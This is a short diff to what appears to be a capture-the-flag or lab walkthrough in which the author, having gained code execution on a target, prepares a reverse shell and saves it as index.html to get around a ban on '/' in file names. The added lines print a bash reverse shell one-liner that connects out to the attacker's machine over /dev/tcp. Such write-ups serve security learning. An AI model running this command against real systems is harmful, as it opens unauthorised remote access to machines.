@@ -184,7 +184,16 @@ Then it makes a request to my machine!
 
 Now i have confirmed code execution i can work on getting a reverse shell
 
-However i cannot place a `/` in the file name, so ill have to save the shell as in
+However i cannot place a `/` in the file name, so ill have to save the shell as index.html 
+
+```python
+❯❯❯ cat index.html 
+bash -i >& /dev/tcp/10.10.14.61/1337 0>&1
+```
+
+Ill first make the shell
+
+
 
 
 
